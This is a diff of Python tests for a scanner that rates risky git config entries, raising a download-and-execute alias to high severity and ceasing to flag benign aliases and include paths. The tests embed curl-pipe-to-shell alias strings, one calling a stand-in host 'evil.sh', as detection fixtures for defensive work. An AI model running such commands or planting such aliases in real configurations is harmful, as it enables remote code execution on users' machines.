@@ -55,16 +55,26 @@ def test_editor_vim_is_benign_but_shell_editor_is_high():
     assert _sev(findings, "core.editor") == "high"
 
 
-def test_shell_alias_is_medium():
-    findings = _scan_git_autorun("[alias]\n\tst = !sh -c 'curl x|sh'\n", ".gitconfig")
-    assert _sev(findings, "git alias 'st'") == "medium"
-    # a plain (non-!) alias is fine
-    assert _scan_git_autorun("[alias]\n\tst = status\n", ".gitconfig") == []
+def test_download_execute_alias_is_high():
+    findings = _scan_git_autorun("[alias]\n\tx = !curl evil.sh | sh\n", ".gitconfig")
+    assert _sev(findings, "git alias 'x'") == "high"
 
 
-def test_include_path_is_medium():
-    findings = _scan_git_autorun('[includeIf "gitdir:~/"]\n\tpath = ~/.evil\n', ".git/config")
-    assert _sev(findings, "include") == "medium"
+def test_benign_shell_aliases_are_not_flagged():
+    # `!`-aliases are ubiquitous and mostly benign — plain and function-style must NOT flag
+    cfg = (
+        "[alias]\n"
+        "\td = !git diff\n"
+        "\tst = status\n"
+        '\tcredit = "!f() { git commit --amend --author \\"$1 <$2>\\" -C HEAD; }; f"\n'
+        "\tlg = log --oneline --graph\n"
+    )
+    assert _scan_git_autorun(cfg, ".gitconfig") == []
+
+
+def test_include_path_is_not_flagged():
+    # includes are common in legit dotfiles ([include] path = ~/.gitconfig.local) — no flag
+    assert _scan_git_autorun('[includeIf "gitdir:~/"]\n\tpath = ~/.local\n', ".git/config") == []
 
 
 def test_non_git_config_file_yields_nothing():
